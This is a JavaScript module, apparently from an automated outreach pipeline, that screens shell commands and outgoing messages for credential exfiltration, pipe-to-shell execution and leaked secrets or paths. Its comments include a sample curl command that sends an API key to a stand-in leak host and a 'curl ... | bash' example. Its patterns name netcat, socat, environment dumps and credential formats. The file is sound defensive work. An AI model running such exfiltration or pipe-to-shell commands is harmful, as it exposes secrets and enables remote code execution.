/**
 * scripts/factory/egress-guard.mjs
 *
 * Port of PAI EgressInspector (security/inspectors/EgressInspector.ts).
 * Blocks credential exfiltration patterns + flags risky egress shell commands
 * BEFORE any outbound dispatch. Wrap every email/DM/post/comment/curl with
 * inspectEgress() and refuse to send when verdict.action === "deny".
 *
 * Three classes of checks, in priority order:
 *   1. Credential patterns combined with outbound tools  → DENY
 *      (e.g. "curl https://leak.example.com -d sk-ant-...")
 *   2. Pipe-to-shell                                     → DENY
 *      (e.g. "curl ... | bash" — auto-execute remote code)
 *   3. Egress alerts                                     → ALERT (allow + log)
 *      (curl POST, wget POST, nc/ncat/socat, sendmail, env dumps,
 *       inline-eval forms of node/python/ruby/perl)
 *
 * Also exports inspectMessage(text): same patterns applied to message bodies
 * (LinkedIn DMs, Telegram, email body) — purely defensive scan, even when no
 * shell is involved.
 */

const OUTBOUND_TOOLS = /\b(curl|wget|nc|ncat|fetch|http)\b/i;

const CREDENTIAL_PATTERNS = [
  [/sk_live_[A-Za-z0-9]{16,}/i,  "Stripe live key"],
  [/sk_test_[A-Za-z0-9]{16,}/i,  "Stripe test key"],
  [/sk-ant-[A-Za-z0-9_\-]{16,}/i, "Anthropic API key"],
  [/sk-proj-[A-Za-z0-9_\-]{16,}/i, "OpenAI project key"],
  [/sk-[A-Za-z0-9]{20,}/i,        "Generic OpenAI/sk-style key"],
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----/i, "Private key material (PEM)"],
  [/whsec_[A-Za-z0-9]{16,}/i,    "Webhook secret"],
  [/AIza[0-9A-Za-z_\-]{35}/,      "Google API key"],
  [/AKIA[0-9A-Z]{16}/,            "AWS access key id"],
  [/ghp_[A-Za-z0-9]{36}/,         "GitHub personal access token"],
  [/xox[baprs]-[A-Za-z0-9-]{10,}/, "Slack token"],
  [/eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}/, "JWT bearer token"],
];

const EGRESS_ALERTS = [
  [/curl[^|]*?(-X\s*POST|--data\b|\s-d\s|--data-binary\b|--data-raw\b)/i, "HTTP POST via curl"],
  [/wget[^|]*?(--post-data|--post-file)/i, "HTTP POST via wget"],
  [/\bnc\s+[^|]/i, "Netcat outbound"],
  [/\bncat\s+[^|]/i, "Ncat outbound"],
  [/\bsocat\s+[^|]/i, "Socat outbound"],
  [/\bsendmail\b/i, "sendmail invocation"],
  [/^\s*(printenv|env)\s*$/im, "Environment variable dump"],
  [/^\s*set\s*$/im, "Shell variable dump"],
  [/python3?\s+-c\s+["']/i, "Python inline execution"],
  [/node\s+-e\s+["']/i, "Node inline execution"],
  [/ruby\s+-e\s+["']/i, "Ruby inline execution"],
  [/perl\s+-e\s+["']/i, "Perl inline execution"],
];

const PIPE_TO_SHELL = /\|\s*(sh|bash|zsh|fish)\b/i;

/**
 * Inspect a Bash command before execution.
 * Returns { action: "allow" | "alert" | "deny", reason?, label? }.
 */
export function inspectBash(command) {
  if (!command || typeof command !== "string") return { action: "allow" };

  // Rule 1: credential exfiltration via outbound tool
  if (OUTBOUND_TOOLS.test(command)) {
    for (const [rx, label] of CREDENTIAL_PATTERNS) {
      if (rx.test(command)) {
        return { action: "deny", reason: `Credential exfiltration blocked: ${label} sent via outbound tool`, label };
      }
    }
  }

  // Rule 2: pipe to shell interpreter
  if (PIPE_TO_SHELL.test(command)) {
    return { action: "deny", reason: "Piping output to shell interpreter (curl ... | bash)" };
  }

  // Rule 3: egress alerts (allow but flag)
  for (const [rx, label] of EGRESS_ALERTS) {
    if (rx.test(command)) {
      return { action: "alert", label, reason: `Egress detected: ${label}` };
    }
  }

  return { action: "allow" };
}

/**
 * Inspect a message body (Telegram text, email body, LinkedIn DM, Reddit comment)
 * for accidental credential leaks. Pure defensive scan - this guards against
 * an LLM hallucinating an env var into a prospect message.
 *
 * Returns { action: "allow" | "deny", reason?, label?, redacted? }.
 * If `redact` is true, returns a sanitized copy with secrets replaced by [REDACTED].
 */
export function inspectMessage(text, { redact = false } = {}) {
  if (!text || typeof text !== "string") return { action: "allow" };

  for (const [rx, label] of CREDENTIAL_PATTERNS) {
    const m = text.match(rx);
    if (m) {
      const out = { action: "deny", reason: `Credential leak blocked: ${label} found in message body`, label, matched: m[0].slice(0, 30) + "…" };
      if (redact) out.redacted = text.replace(rx, "[REDACTED]");
      return out;
    }
  }

  // Internal path leak — common LLM hallucination
  if (/\/Users\/[a-z]+\/(Desktop|Documents|Downloads)/i.test(text)) {
    return { action: "deny", reason: "Internal filesystem path leak (e.g. $HOME/Desktop/...)", label: "filesystem path" };
  }

  // .env / dotenv reference in text body
  if (/\b(apps\/api\/\.env|process\.env\.[A-Z_]{4,})/i.test(text)) {
    return { action: "deny", reason: "Reference to .env file or process.env in message body" };
  }

  return { action: "allow" };
}

/**
 * Combined check: takes a transport ("tg" | "email" | "linkedin" | "reddit" | "shell")
 * and a payload, returns the appropriate inspection result.
 * Use this from any outbound dispatch wrapper.
 */
export function guardEgress({ transport, payload }) {
  if (transport === "shell" || transport === "bash") {
    return inspectBash(typeof payload === "string" ? payload : payload?.command || "");
  }
  // For all message-like transports, run message inspection on text body
  const text = typeof payload === "string" ? payload : (payload?.text || payload?.body || payload?.message || "");
  return inspectMessage(text);
}

/**
 * Convenience: log alert events to .data/egress-alerts.jsonl for forensics.
 * Call after a guarded action when verdict.action === "alert".
 */
export async function logEgressAlert(event) {
  const { appendFileSync, mkdirSync } = await import("node:fs");
  const { resolve, dirname } = await import("node:path");
  const { fileURLToPath } = await import("node:url");
  const here = dirname(fileURLToPath(import.meta.url));
  const path = resolve(here, "../../.data/egress-alerts.jsonl");
  try { mkdirSync(dirname(path), { recursive: true }); } catch {}
  try {
    appendFileSync(path, JSON.stringify({ ts: new Date().toISOString(), ...event }) + "\n");
  } catch {}
}
